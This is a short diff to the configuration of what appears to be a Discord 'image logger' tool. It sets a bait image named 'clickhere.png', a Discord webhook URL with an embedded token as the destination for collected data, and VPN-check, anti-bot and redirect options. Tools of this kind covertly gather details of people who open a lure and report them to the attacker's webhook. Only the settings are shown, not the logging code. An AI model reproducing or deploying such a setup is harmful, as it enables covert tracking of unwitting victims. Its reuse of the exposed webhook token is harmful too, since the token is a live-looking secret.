@@ -23,7 +23,7 @@ __author__ = "lynxWings"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1157015075262058566/KbvdFL6xTMt6eA5Xh-XV3HBzvtecKLxmEg6PYmJH4FtFXMfTACkiYlIqAK6Y96aT7J9I", # <------------------------- Put your webhook link here.
-    "image": "https://cdn.discordapp.com/attachments/1136614339101610084/1142039100145287188/Baslksz48_20230818114015.png", # <------------------------- Put image address link here.
+    "image": "https://cdn.discordapp.com/attachments/1156707106746023949/1157018392377708544/clickhere.png?ex=651714d9&is=6515c359&hm=c157e765d147aee031b5f9c9ad2220ef5b08f7afad319ede4c7355ea92ae6dc5&", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
@@ -42,12 +42,12 @@ config = {
     "vpnCheck": 1, 
 
     "linkAlerts": False,
-    "buggedImage": True,
+    "buggedImage": False,
 
     "antiBot": 1,
 
     "redirect": {
-        "redirect": True,
+        "redirect": False,
         "page": "https://nothingherelol.000webhostapp.com" 
     },
 }
